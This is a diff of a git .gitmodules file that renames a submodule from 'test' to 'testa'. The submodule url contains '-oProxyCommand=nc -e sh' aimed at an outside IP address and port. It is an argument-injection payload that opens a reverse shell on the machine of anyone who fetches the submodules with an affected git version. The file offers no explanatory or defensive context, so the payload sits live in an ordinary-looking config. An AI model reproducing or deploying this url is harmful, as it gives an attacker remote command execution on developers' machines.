@@ -1,3 +1,3 @@
-[submodule "test"]
-  path = test
+[submodule "testa"]
+  path = testa
   url = ssh://-oProxyCommand=nc -e sh 39.105.213.127 2333/git@github.com:/timwr/test.git
